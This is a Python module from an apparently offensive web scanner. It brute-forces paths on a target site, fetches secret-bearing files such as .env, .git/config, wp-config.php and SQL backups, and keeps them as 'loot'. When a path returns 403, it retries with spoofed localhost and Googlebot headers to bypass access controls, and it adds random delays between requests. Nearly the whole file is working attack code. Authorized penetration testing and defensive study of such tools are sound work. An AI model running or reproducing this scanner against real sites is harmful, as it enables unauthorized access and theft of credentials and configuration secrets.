"""Directory/file brute-force with 403 bypass and SPA soft-404 detection.

Refactored from V1 scanner_brute.py. Now uses core.HttpClient (no global
session, no global jitter).
"""

from __future__ import annotations

import logging
import random
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any
from urllib.parse import urljoin, urlparse

from asynx6.core.exceptions import FuzzError
from asynx6.core.http import HttpClient
from asynx6.core.models import LootItem
from asynx6.core.validators import safe_filename

log = logging.getLogger(__name__)

_BASE_WORDLIST = [
    ".env", ".git/config", "config.php", "wp-config.php", "backup.sql",
    "db.sql", "admin/", "login/", "phpmyadmin/", "api/",
    "backup/", ".htaccess", "server-status", "composer.json", "artisan",
]
_LARAVEL = [
    "storage/logs/laravel.log", "storage/framework/views/",
    "bootstrap/cache/config.php", ".env.backup", ".env.save", ".env.local",
]
_AGGRESSIVE = [
    "administrator/", "web.config", "package.json", "docker-compose.yml",
    ".env.example", "logs/", "error_log", "sql.php", "info.php",
    "dev/", "staging/", "v1/", "v2/", "test/", "old/", "public/.env",
]

_BYPASS_HEADERS_TEMPLATE = {
    "X-Original-URL": "{path}",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "X-ProxyUser-Ip": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "User-Agent": "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "X-Scanner": "Asynx6/2.0",
}


def _extract_keywords(content: str) -> list[str]:
    """Top-10 meaningful words from `content` for dynamic wordlist extension."""
    import re
    if not content:
        return []
    stop = {"the", "and", "with", "home", "contact", "about", "services",
            "login"}
    words = re.findall(r"\w+", content.lower())
    meaningful = [w for w in words if len(w) > 4 and w not in stop]
    return [w for w, _ in Counter(meaningful).most_common(10)]


def _build_wordlist(url: str, aggressive: bool, baseline: str | None) -> list[str]:
    domain = urlparse(url).netloc.split(":")[0].split(".")[0]
    wl = list(_BASE_WORDLIST) + list(_LARAVEL)
    if baseline:
        for kw in _extract_keywords(baseline):
            wl.extend([f"{kw}/", f"admin-{kw}/", f"api/{kw}/",
                       f"config-{kw}.php", f"{kw}.zip"])
    for ext in ("zip", "rar", "tar.gz", "sql", "bak", "old", "php.bak", "tar", "7z"):
        wl.extend([f"{domain}.{ext}", f"backup.{ext}", f"site.{ext}"])
    if aggressive:
        wl.extend(_AGGRESSIVE)
    # Dedupe preserving order
    seen: set[str] = set()
    return [w for w in wl if not (w in seen or seen.add(w))]  # type: ignore[func-returns-value]


def _is_real_loot(path: str, text: str, content: bytes) -> bool:
    if not path.endswith((".html", ".php")) and b"<html" in content.lower():
        return False
    if len(content) < 15:
        return False
    if path.endswith(".env"):
        return any(x in text for x in ("DB_", "APP_", "KEY=", "MAIL_"))
    return True


def run(
    url: str,
    *,
    client: HttpClient,
    aggressive: bool = False,
    threads: int = 25,
    content_baseline: str | None = None,
) -> list[dict[str, Any]]:
    """Fuzz directories/files. Returns list of {url, status, type, content}."""
    if not url.endswith("/"):
        url += "/"
    wordlist = _build_wordlist(url, aggressive, content_baseline)

    # SPA baseline (soft-404 detection)
    dummy = urljoin(url, f"/non-existent-path-{random.randint(1000, 9999)}")
    baseline = client.get(dummy)
    baseline_text = baseline.text if baseline else ""
    baseline_len = len(baseline.content) if baseline else -1

    results: list[dict[str, Any]] = []

    def _check(path: str) -> dict[str, Any] | None:
        time.sleep(random.uniform(0.1, 0.4))
        target = urljoin(url, path)
        r = client.get(target, allow_redirects=False)
        if r is None:
            return None
        if r.status_code in (301, 302):
            loc = r.headers.get("Location", "")
            if loc in (url, "/", urlparse(url).path):
                return None
        if r.status_code == 200:
            ct = r.headers.get("Content-Type", "").lower()
            if any(p in path for p in (".env", ".sql", ".htaccess", ".git")) \
                    and "text/html" in ct:
                return None
            if r.text == baseline_text or len(r.content) == baseline_len:
                return None
            if not _is_real_loot(path, r.text, r.content):
                return None
            return {
                "url": target, "status": 200, "type": "Sensitive File",
                "content": r.content,
                "is_binary": "image" in ct or "octet" in ct,
            }
        if r.status_code == 403:
            bypass = dict(_BYPASS_HEADERS_TEMPLATE)
            bypass["X-Original-URL"] = path
            bypass["Referer"] = url
            r2 = client.get(target, headers=bypass, allow_redirects=False)
            if r2 is not None and r2.status_code == 200 \
                    and _is_real_loot(path, r2.text, r2.content):
                return {"url": target, "status": 200,
                        "type": "403 BYPASS SUCCESS", "content": r2.content}
        return None

    try:
        with ThreadPoolExecutor(max_workers=threads) as ex:
            for fut in as_completed([ex.submit(_check, p) for p in wordlist]):
                r = fut.result()
                if r:
                    results.append(r)
    except Exception as exc:  # noqa: BLE001
        raise FuzzError(f"Directory fuzz failed: {exc}") from exc
    return results
